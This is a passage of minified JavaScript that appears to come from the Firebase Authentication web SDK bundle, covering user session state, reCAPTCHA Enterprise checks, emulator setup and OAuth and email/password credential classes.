    if (De(this.app)) return Promise.reject(ot(this));
    const t = e ? Le(e) : null;
    return (
      t &&
        F(
          t.auth.config.apiKey === this.config.apiKey,
          this,
          "invalid-user-token"
        ),
      this._updateCurrentUser(t && t._clone(this))
    );
  }
  async _updateCurrentUser(e, t = !1) {
    if (!this._deleted)
      return (
        e && F(this.tenantId === e.tenantId, this, "tenant-id-mismatch"),
        t || (await this.beforeStateQueue.runMiddleware(e)),
        this.queue(async () => {
          await this.directlySetCurrentUser(e), this.notifyAuthListeners();
        })
      );
  }
  async signOut() {
    return De(this.app)
      ? Promise.reject(ot(this))
      : (await this.beforeStateQueue.runMiddleware(null),
        (this.redirectPersistenceManager || this._popupRedirectResolver) &&
          (await this._setRedirectUser(null)),
        this._updateCurrentUser(null, !0));
  }
  setPersistence(e) {
    return De(this.app)
      ? Promise.reject(ot(this))
      : this.queue(async () => {
          await this.assertedPersistence.setPersistence(Ge(e));
        });
  }
  _getRecaptchaConfig() {
    return null == this.tenantId
      ? this._agentRecaptchaConfig
      : this._tenantRecaptchaConfigs[this.tenantId];
  }
  async validatePassword(e) {
    this._getPasswordPolicyInternal() || (await this._updatePasswordPolicy());
    const t = this._getPasswordPolicyInternal();
    return t.schemaVersion !== this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION
      ? Promise.reject(
          this._errorFactory.create(
            "unsupported-password-policy-schema-version",
            {}
          )
        )
      : t.validatePassword(e);
  }
  _getPasswordPolicyInternal() {
    return null === this.tenantId
      ? this._projectPasswordPolicy
      : this._tenantPasswordPolicies[this.tenantId];
  }
  async _updatePasswordPolicy() {
    const e = await Cu(this),
      t = new Ru(e);
    null === this.tenantId
      ? (this._projectPasswordPolicy = t)
      : (this._tenantPasswordPolicies[this.tenantId] = t);
  }
  _getPersistence() {
    return this.assertedPersistence.persistence.type;
  }
  _updateErrorMap(e) {
    this._errorFactory = new wt("auth", "Firebase", e());
  }
  onAuthStateChanged(e, t, r) {
    return this.registerStateListener(this.authStateSubscription, e, t, r);
  }
  beforeAuthStateChanged(e, t) {
    return this.beforeStateQueue.pushCallback(e, t);
  }
  onIdTokenChanged(e, t, r) {
    return this.registerStateListener(this.idTokenSubscription, e, t, r);
  }
  authStateReady() {
    return new Promise((e, t) => {
      if (this.currentUser) e();
      else {
        const r = this.onAuthStateChanged(() => {
          r(), e();
        }, t);
      }
    });
  }
  async revokeAccessToken(e) {
    if (this.currentUser) {
      const r = {
        providerId: "apple.com",
        tokenType: "ACCESS_TOKEN",
        token: e,
        idToken: await this.currentUser.getIdToken(),
      };
      null != this.tenantId && (r.tenantId = this.tenantId), await ku(this, r);
    }
  }
  toJSON() {
    var e;
    return {
      apiKey: this.config.apiKey,
      authDomain: this.config.authDomain,
      appName: this.name,
      currentUser:
        null === (e = this._currentUser) || void 0 === e ? void 0 : e.toJSON(),
    };
  }
  async _setRedirectUser(e, t) {
    const r = await this.getOrInitRedirectPersistenceManager(t);
    return null === e ? r.removeCurrentUser() : r.setCurrentUser(e);
  }
  async getOrInitRedirectPersistenceManager(e) {
    if (!this.redirectPersistenceManager) {
      const t = (e && Ge(e)) || this._popupRedirectResolver;
      F(t, this, "argument-error"),
        (this.redirectPersistenceManager = await Ct.create(
          this,
          [Ge(t._redirectPersistence)],
          "redirectUser"
        )),
        (this.redirectUser =
          await this.redirectPersistenceManager.getCurrentUser());
    }
    return this.redirectPersistenceManager;
  }
  async _redirectUserForId(e) {
    var t, r;
    return (
      this._isInitialized && (await this.queue(async () => {})),
      (null === (t = this._currentUser) || void 0 === t
        ? void 0
        : t._redirectEventId) === e
        ? this._currentUser
        : (null === (r = this.redirectUser) || void 0 === r
            ? void 0
            : r._redirectEventId) === e
        ? this.redirectUser
        : null
    );
  }
  async _persistUserIfCurrent(e) {
    if (e === this.currentUser)
      return this.queue(async () => this.directlySetCurrentUser(e));
  }
  _notifyListenersIfCurrent(e) {
    e === this.currentUser && this.notifyAuthListeners();
  }
  _key() {
    return `${this.config.authDomain}:${this.config.apiKey}:${this.name}`;
  }
  _startProactiveRefresh() {
    (this.isProactiveRefreshEnabled = !0),
      this.currentUser && this._currentUser._startProactiveRefresh();
  }
  _stopProactiveRefresh() {
    (this.isProactiveRefreshEnabled = !1),
      this.currentUser && this._currentUser._stopProactiveRefresh();
  }
  get _currentUser() {
    return this.currentUser;
  }
  notifyAuthListeners() {
    var e, t;
    if (!this._isInitialized) return;
    this.idTokenSubscription.next(this.currentUser);
    const r =
      null !==
        (t =
          null === (e = this.currentUser) || void 0 === e ? void 0 : e.uid) &&
      void 0 !== t
        ? t
        : null;
    this.lastNotifiedUid !== r &&
      ((this.lastNotifiedUid = r),
      this.authStateSubscription.next(this.currentUser));
  }
  registerStateListener(e, t, r, i) {
    if (this._deleted) return () => {};
    const o = "function" == typeof t ? t : t.next.bind(t);
    let s = !1;
    const a = this._isInitialized
      ? Promise.resolve()
      : this._initializationPromise;
    if (
      (F(a, this, "internal-error"),
      a.then(() => {
        s || o(this.currentUser);
      }),
      "function" == typeof t)
    ) {
      const l = e.addObserver(t, r, i);
      return () => {
        (s = !0), l();
      };
    }
    {
      const l = e.addObserver(t);
      return () => {
        (s = !0), l();
      };
    }
  }
  async directlySetCurrentUser(e) {
    this.currentUser &&
      this.currentUser !== e &&
      this._currentUser._stopProactiveRefresh(),
      e && this.isProactiveRefreshEnabled && e._startProactiveRefresh(),
      (this.currentUser = e),
      e
        ? await this.assertedPersistence.setCurrentUser(e)
        : await this.assertedPersistence.removeCurrentUser();
  }
  queue(e) {
    return (this.operations = this.operations.then(e, e)), this.operations;
  }
  get assertedPersistence() {
    return (
      F(this.persistenceManager, this, "internal-error"),
      this.persistenceManager
    );
  }
  _logFramework(e) {
    !e ||
      this.frameworks.includes(e) ||
      (this.frameworks.push(e),
      this.frameworks.sort(),
      (this.clientVersion = sa(
        this.config.clientPlatform,
        this._getFrameworks()
      )));
  }
  _getFrameworks() {
    return this.frameworks;
  }
  async _getAdditionalHeaders() {
    var e;
    const t = { "X-Client-Version": this.clientVersion };
    this.app.options.appId && (t["X-Firebase-gmpid"] = this.app.options.appId);
    const r = await (null ===
      (e = this.heartbeatServiceProvider.getImmediate({ optional: !0 })) ||
    void 0 === e
      ? void 0
      : e.getHeartbeatsHeader());
    r && (t["X-Firebase-Client"] = r);
    const i = await this._getAppCheckToken();
    return i && (t["X-Firebase-AppCheck"] = i), t;
  }
  async _getAppCheckToken() {
    var e;
    const t = await (null ===
      (e = this.appCheckServiceProvider.getImmediate({ optional: !0 })) ||
    void 0 === e
      ? void 0
      : e.getToken());
    return (
      null != t &&
        t.error &&
        iu(`Error while retrieving App Check token: ${t.error}`),
      null == t ? void 0 : t.token
    );
  }
}
function _t(n) {
  return Le(n);
}
class hi {
  constructor(e) {
    (this.auth = e),
      (this.observer = null),
      (this.addObserver = Bl((t) => (this.observer = t)));
  }
  get next() {
    return (
      F(this.observer, this.auth, "internal-error"),
      this.observer.next.bind(this.observer)
    );
  }
}
let Ln = {
  async loadJS() {
    throw new Error("Unable to load external scripts");
  },
  recaptchaV2Script: "",
  recaptchaEnterpriseScript: "",
  gapiScript: "",
};
function xu(n) {
  Ln = n;
}
function aa(n) {
  return Ln.loadJS(n);
}
function Ou() {
  return Ln.recaptchaEnterpriseScript;
}
function Lu() {
  return Ln.gapiScript;
}
function Nu(n) {
  return `__${n}${Math.floor(1e6 * Math.random())}`;
}
const Mu = "recaptcha-enterprise",
  Du = "NO_RECAPTCHA";
class Uu {
  constructor(e) {
    (this.type = Mu), (this.auth = _t(e));
  }
  async verify(e = "verify", t = !1) {
    function i(o, s, a) {
      const l = window.grecaptcha;
      ci(l)
        ? l.enterprise.ready(() => {
            l.enterprise
              .execute(o, { action: e })
              .then((c) => {
                s(c);
              })
              .catch(() => {
                s(Du);
              });
          })
        : a(Error("No reCAPTCHA enterprise script loaded."));
    }
    return new Promise((o, s) => {
      (async function r(o) {
        if (!t) {
          if (null == o.tenantId && null != o._agentRecaptchaConfig)
            return o._agentRecaptchaConfig.siteKey;
          if (
            null != o.tenantId &&
            void 0 !== o._tenantRecaptchaConfigs[o.tenantId]
          )
            return o._tenantRecaptchaConfigs[o.tenantId].siteKey;
        }
        return new Promise(async (s, a) => {
          hu(o, {
            clientType: "CLIENT_TYPE_WEB",
            version: "RECAPTCHA_ENTERPRISE",
          })
            .then((l) => {
              if (void 0 !== l.recaptchaKey) {
                const c = new pu(l);
                return (
                  null == o.tenantId
                    ? (o._agentRecaptchaConfig = c)
                    : (o._tenantRecaptchaConfigs[o.tenantId] = c),
                  s(c.siteKey)
                );
              }
              a(new Error("recaptcha Enterprise site key undefined"));
            })
            .catch((l) => {
              a(l);
            });
        });
      })(this.auth)
        .then((a) => {
          if (!t && ci(window.grecaptcha)) i(a, o, s);
          else {
            if (typeof window > "u")
              return void s(
                new Error("RecaptchaVerifier is only supported in browser")
              );
            let l = Ou();
            0 !== l.length && (l += a),
              aa(l)
                .then(() => {
                  i(a, o, s);
                })
                .catch((c) => {
                  s(c);
                });
          }
        })
        .catch((a) => {
          s(a);
        });
    });
  }
}
async function mi(n, e, t, r = !1) {
  const i = new Uu(n);
  let o;
  try {
    o = await i.verify(t);
  } catch {
    o = await i.verify(t, !0);
  }
  const s = Object.assign({}, e);
  return (
    r
      ? Object.assign(s, { captchaResp: o })
      : Object.assign(s, { captchaResponse: o }),
    Object.assign(s, { clientType: "CLIENT_TYPE_WEB" }),
    Object.assign(s, { recaptchaVersion: "RECAPTCHA_ENTERPRISE" }),
    s
  );
}
async function ur(n, e, t, r) {
  var i;
  if (
    null !== (i = n._getRecaptchaConfig()) &&
    void 0 !== i &&
    i.isProviderEnabled("EMAIL_PASSWORD_PROVIDER")
  ) {
    const o = await mi(n, e, t, "getOobCode" === t);
    return r(n, o);
  }
  return r(n, e).catch(async (o) => {
    if ("auth/missing-recaptcha-token" === o.code) {
      console.log(
        `${t} is protected by reCAPTCHA Enterprise for this project. Automatically triggering the reCAPTCHA flow and restarting the flow.`
      );
      const s = await mi(n, e, t, "getOobCode" === t);
      return r(n, s);
    }
    return Promise.reject(o);
  });
}
function Fu(n, e) {
  const t = Nt(n, "auth");
  if (t.isInitialized()) {
    const i = t.getImmediate();
    if (Kt(t.getOptions(), null != e ? e : {})) return i;
    Pe(i, "already-initialized");
  }
  return t.initialize({ options: e });
}
function Hu(n, e) {
  const t = (null == e ? void 0 : e.persistence) || [],
    r = (Array.isArray(t) ? t : [t]).map(Ge);
  null != e && e.errorMap && n._updateErrorMap(e.errorMap),
    n._initializeWithPersistence(
      r,
      null == e ? void 0 : e.popupRedirectResolver
    );
}
function ju(n, e, t) {
  const r = _t(n);
  F(r._canInitEmulator, r, "emulator-config-failed"),
    F(/^https?:\/\//.test(e), r, "invalid-emulator-scheme");
  const i = !(null == t || !t.disableWarnings),
    o = la(e),
    { host: s, port: a } = zu(e),
    l = null === a ? "" : `:${a}`;
  (r.config.emulator = { url: `${o}//${s}${l}/` }),
    (r.settings.appVerificationDisabledForTesting = !0),
    (r.emulatorConfig = Object.freeze({
      host: s,
      port: a,
      protocol: o.replace(":", ""),
      options: Object.freeze({ disableWarnings: i }),
    })),
    i || Bu();
}
function la(n) {
  const e = n.indexOf(":");
  return e < 0 ? "" : n.substr(0, e + 1);
}
function zu(n) {
  const e = la(n),
    t = /(\/\/)?([^?#/]+)/.exec(n.substr(e.length));
  if (!t) return { host: "", port: null };
  const r = t[2].split("@").pop() || "",
    i = /^(\[[^\]]+\])(:|$)/.exec(r);
  if (i) {
    const o = i[1];
    return { host: o, port: gi(r.substr(o.length + 1)) };
  }
  {
    const [o, s] = r.split(":");
    return { host: o, port: gi(s) };
  }
}
function gi(n) {
  if (!n) return null;
  const e = Number(n);
  return isNaN(e) ? null : e;
}
function Bu() {
  function n() {
    const e = document.createElement("p"),
      t = e.style;
    (e.innerText =
      "Running in emulator mode. Do not use with production credentials."),
      (t.position = "fixed"),
      (t.width = "100%"),
      (t.backgroundColor = "#ffffff"),
      (t.border = ".1em solid #000000"),
      (t.color = "#b50000"),
      (t.bottom = "0px"),
      (t.left = "0px"),
      (t.margin = "0px"),
      (t.zIndex = "10000"),
      (t.textAlign = "center"),
      e.classList.add("firebase-emulator-warning"),
      document.body.appendChild(e);
  }
  typeof console < "u" &&
    "function" == typeof console.info &&
    console.info(
      "WARNING: You are using the Auth Emulator, which is intended for local testing only.  Do not use with production credentials."
    ),
    typeof window < "u" &&
      typeof document < "u" &&
      ("loading" === document.readyState
        ? window.addEventListener("DOMContentLoaded", n)
        : n());
}
class Sr {
  constructor(e, t) {
    (this.providerId = e), (this.signInMethod = t);
  }
  toJSON() {
    return qe("not implemented");
  }
  _getIdTokenResponse(e) {
    return qe("not implemented");
  }
  _linkToIdToken(e, t) {
    return qe("not implemented");
  }
  _getReauthenticationResolver(e) {
    return qe("not implemented");
  }
}
async function Vu(n, e) {
  return Xe(n, "POST", "/v1/accounts:signUp", e);
}
async function $u(n, e) {
  return xn(n, "POST", "/v1/accounts:signInWithPassword", lt(n, e));
}
async function qu(n, e) {
  return Xe(n, "POST", "/v1/accounts:sendOobCode", lt(n, e));
}
async function Wu(n, e) {
  return qu(n, e);
}
async function Gu(n, e) {
  return xn(n, "POST", "/v1/accounts:signInWithEmailLink", lt(n, e));
}
async function Ku(n, e) {
  return xn(n, "POST", "/v1/accounts:signInWithEmailLink", lt(n, e));
}
class Xt extends Sr {
  constructor(e, t, r, i = null) {
    super("password", r),
      (this._email = e),
      (this._password = t),
      (this._tenantId = i);
  }
  static _fromEmailAndPassword(e, t) {
    return new Xt(e, t, "password");
  }
  static _fromEmailAndCode(e, t, r = null) {
    return new Xt(e, t, "emailLink", r);
  }
  toJSON() {
    return {
      email: this._email,
      password: this._password,
      signInMethod: this.signInMethod,
      tenantId: this._tenantId,
    };
  }
  static fromJSON(e) {
    const t = "string" == typeof e ? JSON.parse(e) : e;
    if ((null == t ? void 0 : t.email) && (null == t ? void 0 : t.password)) {
      if ("password" === t.signInMethod)
        return this._fromEmailAndPassword(t.email, t.password);
      if ("emailLink" === t.signInMethod)
        return this._fromEmailAndCode(t.email, t.password, t.tenantId);
    }
    return null;
  }
  async _getIdTokenResponse(e) {
    switch (this.signInMethod) {
      case "password":
        return ur(
          e,
          {
            returnSecureToken: !0,
            email: this._email,
            password: this._password,
            clientType: "CLIENT_TYPE_WEB",
          },
          "signInWithPassword",
          $u
        );
      case "emailLink":
        return Gu(e, { email: this._email, oobCode: this._password });
      default:
        Pe(e, "internal-error");
    }
  }
  async _linkToIdToken(e, t) {
    switch (this.signInMethod) {
      case "password":
        return ur(
          e,
          {
            idToken: t,
            returnSecureToken: !0,
            email: this._email,
            password: this._password,
            clientType: "CLIENT_TYPE_WEB",
          },
          "signUpPassword",
          Vu
        );
      case "emailLink":
        return Ku(e, {
          idToken: t,
          email: this._email,
          oobCode: this._password,
        });
      default:
        Pe(e, "internal-error");
    }
  }
  _getReauthenticationResolver(e) {
    return this._getIdTokenResponse(e);
  }
}
async function At(n, e) {
  return xn(n, "POST", "/v1/accounts:signInWithIdp", lt(n, e));
}
const Yu = "http://localhost";
class Je extends Sr {
  constructor() {
    super(...arguments), (this.pendingToken = null);
  }
  static _fromParams(e) {
    const t = new Je(e.providerId, e.signInMethod);
    return (
      e.idToken || e.accessToken
        ? (e.idToken && (t.idToken = e.idToken),
          e.accessToken && (t.accessToken = e.accessToken),
          e.nonce && !e.pendingToken && (t.nonce = e.nonce),
          e.pendingToken && (t.pendingToken = e.pendingToken))
        : e.oauthToken && e.oauthTokenSecret
        ? ((t.accessToken = e.oauthToken), (t.secret = e.oauthTokenSecret))
        : Pe("argument-error"),
      t
    );
  }
  toJSON() {
    return {
      idToken: this.idToken,
      accessToken: this.accessToken,
      secret: this.secret,
      nonce: this.nonce,
      pendingToken: this.pendingToken,
      providerId: this.providerId,
      signInMethod: this.signInMethod,
    };
  }
  static fromJSON(e) {
    const t = "string" == typeof e ? JSON.parse(e) : e,
      { providerId: r, signInMethod: i } = t,
      o = yr(t, ["providerId", "signInMethod"]);
    if (!r || !i) return null;
    const s = new Je(r, i);
    return (
      (s.idToken = o.idToken || void 0),
      (s.accessToken = o.accessToken || void 0),
      (s.secret = o.secret),
      (s.nonce = o.nonce),
      (s.pendingToken = o.pendingToken || null),
      s
    );
  }
  _getIdTokenResponse(e) {
    return At(e, this.buildRequest());
  }
  _linkToIdToken(e, t) {
    const r = this.buildRequest();
    return (r.idToken = t), At(e, r);
  }
  _getReauthenticationResolver(e) {
    const t = this.buildRequest();
    return (t.autoCreate = !1), At(e, t);
  }
  buildRequest() {
    const e = { requestUri: Yu, returnSecureToken: !0 };
    if (this.pendingToken) e.pendingToken = this.pendingToken;
    else {
      const t = {};
      this.idToken && (t.id_token = this.idToken),
        this.accessToken && (t.access_token = this.accessToken),
        this.secret && (t.oauth_token_secret = this.secret),
        (t.providerId = this.providerId),
        this.nonce && !this.pendingToken && (t.nonce = this.nonce),
        (e.postBody = en(t));
    }
    return e;
  }
}
function Ju(n) {
  switch (n) {
    case "recoverEmail":
      return "RECOVER_EMAIL";
    case "resetPassword":
      return "PASSWORD_RESET";
    case "signIn":
      return "EMAIL_SIGNIN";
    case "verifyEmail":
      return "VERIFY_EMAIL";
    case "verifyAndChangeEmail":
      return "VERIFY_AND_CHANGE_EMAIL";
    case "revertSecondFactorAddition":
      return "REVERT_SECOND_FACTOR_ADDITION";
    default:
      return null;
  }
}
function Xu(n) {
  const e = jt(zt(n)).link,
    t = e ? jt(zt(e)).deep_link_id : null,
    r = jt(zt(n)).deep_link_id;
  return (r ? jt(zt(r)).link : null) || r || t || e || n;
}
class Nn {
  constructor(e) {
    var t, r, i, o, s, a;
    const l = jt(zt(e)),
      c = null !== (t = l.apiKey) && void 0 !== t ? t : null,
      d = null !== (r = l.oobCode) && void 0 !== r ? r : null,
      u = Ju(null !== (i = l.mode) && void 0 !== i ? i : null);
    F(c && d && u, "argument-error"),
      (this.apiKey = c),
      (this.operation = u),
      (this.code = d),
      (this.continueUrl =
        null !== (o = l.continueUrl) && void 0 !== o ? o : null),
      (this.languageCode =
        null !== (s = l.languageCode) && void 0 !== s ? s : null),
      (this.tenantId = null !== (a = l.tenantId) && void 0 !== a ? a : null);
  }
  static parseLink(e) {
    const t = Xu(e);
    try {
      return new Nn(t);
    } catch {
      return null;
    }
  }
}
class Mt {
  constructor() {
    this.providerId = Mt.PROVIDER_ID;
  }
  static credential(e, t) {
    return Xt._fromEmailAndPassword(e, t);
  }
  static credentialWithLink(e, t) {
    const r = Nn.parseLink(t);
    return F(r, "argument-error"), Xt._fromEmailAndCode(e, r.code, r.tenantId);
  }
}
(Mt.PROVIDER_ID = "password"),
  (Mt.EMAIL_PASSWORD_SIGN_IN_METHOD = "password"),
  (Mt.EMAIL_LINK_SIGN_IN_METHOD = "emailLink");
class Cr {
  constructor(e) {
    (this.providerId = e),
      (this.defaultLanguageCode = null),
      (this.customParameters = {});
  }
  setDefaultLanguage(e) {
    this.defaultLanguageCode = e;
  }
  setCustomParameters(e) {
    return (this.customParameters = e), this;
  }
  getCustomParameters() {
    return this.customParameters;
  }
}
class Dt extends Cr {
  constructor() {
    super(...arguments), (this.scopes = []);
  }
  addScope(e) {
    return this.scopes.includes(e) || this.scopes.push(e), this;
  }
  getScopes() {
    return [...this.scopes];
  }
}
class Wt extends Dt {
  static credentialFromJSON(e) {
    const t = "string" == typeof e ? JSON.parse(e) : e;
    return (
      F("providerId" in t && "signInMethod" in t, "argument-error"),
      Je._fromParams(t)
    );
  }
  credential(e) {
    return this._credential(
      Object.assign(Object.assign({}, e), { nonce: e.rawNonce })
    );
  }
  _credential(e) {
    return (
      F(e.idToken || e.accessToken, "argument-error"),
      Je._fromParams(
        Object.assign(Object.assign({}, e), {
          providerId: this.providerId,
          signInMethod: this.providerId,
        })
      )
    );
  }
  static credentialFromResult(e) {
    return Wt.oauthCredentialFromTaggedObject(e);
  }
  static credentialFromError(e) {
    return Wt.oauthCredentialFromTaggedObject(e.customData || {});
  }
  static oauthCredentialFromTaggedObject({ _tokenResponse: e }) {
    if (!e) return null;
    const {
      oauthIdToken: t,
      oauthAccessToken: r,
      oauthTokenSecret: i,
      pendingToken: o,
      nonce: s,
      providerId: a,
    } = e;
    if ((!r && !i && !t && !o) || !a) return null;
    try {
      return new Wt(a)._credential({
        idToken: t,
        accessToken: r,
        nonce: s,
        pendingToken: o,
      });
    } catch {
      return null;
    }
  }
}
class et extends Dt {
  constructor() {
    super("facebook.com");
  }
  static credential(e) {
    return Je._fromParams({
      providerId: et.PROVIDER_ID,
      signInMethod: et.FACEBOOK_SIGN_IN_METHOD,
      accessToken: e,
    });
  }
  static credentialFromResult(e) {
    return et.credentialFromTaggedObject(e);
  }
  static credentialFromError(e) {
    return et.credentialFromTaggedObject(e.customData || {});
  }
  static credentialFromTaggedObject({ _tokenResponse: e }) {
    if (!e || !("oauthAccessToken" in e) || !e.oauthAccessToken) return null;
    try {
      return et.credential(e.oauthAccessToken);
    } catch {
      return null;
    }
  }
}
(et.FACEBOOK_SIGN_IN_METHOD = "facebook.com"),
  (et.PROVIDER_ID = "facebook.com");
class $e extends Dt {
  constructor() {
    super("google.com"), this.addScope("profile");
  }
  static credential(e, t) {
    return Je._fromParams({
      providerId: $e.PROVIDER_ID,
      signInMethod: $e.GOOGLE_SIGN_IN_METHOD,
      idToken: e,
      accessToken: t,
    });
  }
  static credentialFromResult(e) {
    return $e.credentialFromTaggedObject(e);
  }
  static credentialFromError(e) {
    return $e.credentialFromTaggedObject(e.customData || {});
  }
  static credentialFromTaggedObject({ _tokenResponse: e }) {
    if (!e) return null;
    const { oauthIdToken: t, oauthAccessToken: r } = e;
    if (!t && !r) return null;
    try {
      return $e.credential(t, r);
    } catch {
      return null;
    }
  }
}
($e.GOOGLE_SIGN_IN_METHOD = "google.com"), ($e.PROVIDER_ID = "google.com");
class tt extends Dt {
  constructor() {
    super("github.com");
  }
  static credential(e) {
    return Je._fromParams({
      providerId: tt.PROVIDER_ID,
      signInMethod: tt.GITHUB_SIGN_IN_METHOD,
      accessToken: e,
    });
  }
  static credentialFromResult(e) {
    return tt.credentialFromTaggedObject(e);
  }
  static credentialFromError(e) {
    return tt.credentialFromTaggedObject(e.customData || {});
  }
  static credentialFromTaggedObject({ _tokenResponse: e }) {
    if (!e || !("oauthAccessToken" in e) || !e.oauthAccessToken) return null;
    try {
      return tt.credential(e.oauthAccessToken);
    } catch {
      return null;
    }
  }
}
(tt.GITHUB_SIGN_IN_METHOD = "github.com"), (tt.PROVIDER_ID = "github.com");
class nt extends Dt {
  constructor() {
    super("twitter.com");
  }
  static credential(e, t) {
    return Je._fromParams({
      providerId: nt.PROVIDER_ID,
      signInMethod: nt.TWITTER_SIGN_IN_METHOD,
      oauthToken: e,
      oauthTokenSecret: t,
    });
  }
  static credentialFromResult(e) {
    return nt.credentialFromTaggedObject(e);
  }
  static credentialFromError(e) {
    return nt.credentialFromTaggedObject(e.customData || {});
  }
  static credentialFromTaggedObject({ _tokenResponse: e }) {
    if (!e) return null;
    const { oauthAccessToken: t, oauthTokenSecret: r } = e;
    if (!t || !r) return null;
    try {
      return nt.credential(t, r);
    } catch {
      return null;
    }
  }
}
(nt.TWITTER_SIGN_IN_METHOD = "twitter.com"), (nt.PROVIDER_ID = "twitter.com");
class xt {
  constructor(e) {
    (this.user = e.user),
      (this.providerId = e.providerId),
      (this._tokenResponse = e._tokenResponse),
      (this.operationType = e.operationType);
  }
  static async _fromIdTokenResponse(e, t, r, i = !1) {
    const o = await We._fromIdTokenResponse(e, r, i),
      s = bi(r);
    return new xt({
      user: o,
      providerId: s,
      _tokenResponse: r,
      operationType: t,
    });
  }
  static async _forOperation(e, t, r) {
    await e._updateTokensIfNecessary(r, !0);
    const i = bi(r);
    return new xt({
      user: e,
      providerId: i,
      _tokenResponse: r,
      operationType: t,
    });
  }
}
function bi(n) {
  return n.providerId ? n.providerId : "phoneNumber" in n ? "phone" : null;
}
class In extends ze {
  constructor(e, t, r, i) {
    var o;
    super(t.code, t.message),
      (this.operationType = r),
      (this.user = i),
      Object.setPrototypeOf(this, In.prototype),
      (this.customData = {
        appName: e.name,
        tenantId: null !== (o = e.tenantId) && void 0 !== o ? o : void 0,
        _serverResponse: t.customData._serverResponse,
        operationType: r,
      });
  }
  static _fromErrorAndOperation(e, t, r, i) {
    return new In(e, t, r, i);
  }
}
function ca(n, e, t, r) {
  return (
    "reauthenticate" === e
      ? t._getReauthenticationResolver(n)
      : t._getIdTokenResponse(n)
  ).catch((o) => {
    throw "auth/multi-factor-auth-required" === o.code
      ? In._fromErrorAndOperation(n, o, e, r)
      : o;
  });
}
async function Zu(n, e, t = !1) {
  const r = await Jt(n, e._linkToIdToken(n.auth, await n.getIdToken()), t);
  return xt._forOperation(n, "link", r);
}
async function Qu(n, e, t = !1) {
  const { auth: r } = n;
  if (De(r.app)) return Promise.reject(ot(r));
  const i = "reauthenticate";
  try {
    const o = await Jt(n, ca(r, i, e, n), t);
    F(o.idToken, r, "internal-error");
    const s = Er(o.idToken);
    F(s, r, "internal-error");
    const { sub: a } = s;
    return F(n.uid === a, r, "user-mismatch"), xt._forOperation(n, i, o);
  } catch (o) {
    throw (
      ("auth/user-not-found" === (null == o ? void 0 : o.code) &&
        Pe(r, "user-mismatch"),
      o)
    );
  }
}
async function ua(n, e, t = !1) {
  if (De(n.app)) return Promise.reject(ot(n));
  const r = "signIn",
    i = await ca(n, r, e),
    o = await xt._fromIdTokenResponse(n, r, i);
  return t || (await n._updateCurrentUser(o.user)), o;
}
async function ed(n, e) {
  return ua(_t(n), e);
}
function td(n, e, t) {
  var r;
  F(
    (null === (r = t.url) || void 0 === r ? void 0 : r.length) > 0,
    n,
    "invalid-continue-uri"
  ),
    F(
      typeof t.dynamicLinkDomain > "u" || t.dynamicLinkDomain.length > 0,
      n,
      "invalid-dynamic-link-domain"
    ),
    (e.continueUrl = t.url),
    (e.dynamicLinkDomain = t.dynamicLinkDomain),
    (e.canHandleCodeInApp = t.handleCodeInApp),
    t.iOS &&
      (F(t.iOS.bundleId.length > 0, n, "missing-ios-bundle-id"),
      (e.iOSBundleId = t.iOS.bundleId)),
    t.android &&
      (F(t.android.packageName.length > 0, n, "missing-android-pkg-name"),
      (e.androidInstallApp = t.android.installApp),
      (e.androidMinimumVersionCode = t.android.minimumVersion),
      (e.androidPackageName = t.android.packageName));
}
async function nd(n, e, t) {
  const r = _t(n),
    i = {
      requestType: "EMAIL_SIGNIN",
      email: e,
      clientType: "CLIENT_TYPE_WEB",
    };
  (function o(s, a) {
    F(a.handleCodeInApp, r, "argument-error"), a && td(r, s, a);
  })(i, t),
    await ur(r, i, "getOobCode", Wu);
}
function rd(n, e) {
  const t = Nn.parseLink(e);
  return "EMAIL_SIGNIN" === (null == t ? void 0 : t.operation);
}
async function id(n, e, t) {
  if (De(n.app)) return Promise.reject(ot(n));
  const r = Le(n),
    i = Mt.credentialWithLink(e, t || vn());
  return (
    F(i._tenantId === (r.tenantId || null), r, "tenant-id-mismatch"), ed(r, i)
  );
}
function od(n, e, t, r) {
  return Le(n).onIdTokenChanged(e, t, r);
}
function sd(n, e, t) {
  return Le(n).beforeAuthStateChanged(e, t);
}
function ad(n, e, t, r) {
  return Le(n).onAuthStateChanged(e, t, r);
}
function ld(n) {
  return Le(n).signOut();
}
const En = "__sak";
class da {
  constructor(e, t) {
    (this.storageRetriever = e), (this.type = t);
  }
  _isAvailable() {
    try {
      return this.storage
        ? (this.storage.setItem(En, "1"),
          this.storage.removeItem(En),
          Promise.resolve(!0))
        : Promise.resolve(!1);
    } catch {
      return Promise.resolve(!1);
    }
  }
  _set(e, t) {
    return this.storage.setItem(e, JSON.stringify(t)), Promise.resolve();
  }
  _get(e) {
    const t = this.storage.getItem(e);
    return Promise.resolve(t ? JSON.parse(t) : null);
  }
  _remove(e) {
    return this.storage.removeItem(e), Promise.resolve();
  }
  get storage() {
    return this.storageRetriever();
  }
}
function cd() {
  const n = ve();
  return Tr(n) || On(n);
}
const ud = 1e3,
  dd = 10;
class fa extends da {
  constructor() {
    super(() => window.localStorage, "LOCAL"),
      (this.boundEventHandler = (e, t) => this.onStorageEvent(e, t)),
      (this.listeners = {}),
      (this.localCache = {}),
      (this.pollTimer = null),
      (this.safariLocalStorageNotSynced = cd() && Tu()),
      (this.fallbackToPolling = oa()),
      (this._shouldAllowMigration = !0);
  }
  forAllChangedKeys(e) {
    for (const t of Object.keys(this.listeners)) {
      const r = this.storage.getItem(t),
        i = this.localCache[t];
      r !== i && e(t, i, r);
    }
  }
  onStorageEvent(e, t = !1) {
    if (!e.key)
      return void this.forAllChangedKeys((s, a, l) => {
        this.notifyListeners(s, l);
      });
    const r = e.key;
    if (
      (t ? this.detachListener() : this.stopPolling(),
      this.safariLocalStorageNotSynced)
    ) {
      const s = this.storage.getItem(r);
      if (e.newValue !== s)
        null !== e.newValue
          ? this.storage.setItem(r, e.newValue)
          : this.storage.removeItem(r);
      else if (this.localCache[r] === e.newValue && !t) return;
    }
    const i = () => {
        const s = this.storage.getItem(r);
        (!t && this.localCache[r] === s) || this.notifyListeners(r, s);
      },
      o = this.storage.getItem(r);
    Eu() && o !== e.newValue && e.newValue !== e.oldValue
      ? setTimeout(i, 10)
      : i();
  }
  notifyListeners(e, t) {
    this.localCache[e] = t;
    const r = this.listeners[e];
    if (r) for (const i of Array.from(r)) i(t && JSON.parse(t));
  }
  startPolling() {
    this.stopPolling(),
      (this.pollTimer = setInterval(() => {
        this.forAllChangedKeys((e, t, r) => {
          this.onStorageEvent(
            new StorageEvent("storage", { key: e, oldValue: t, newValue: r }),
            !0
          );
        });
      }, ud));
  }
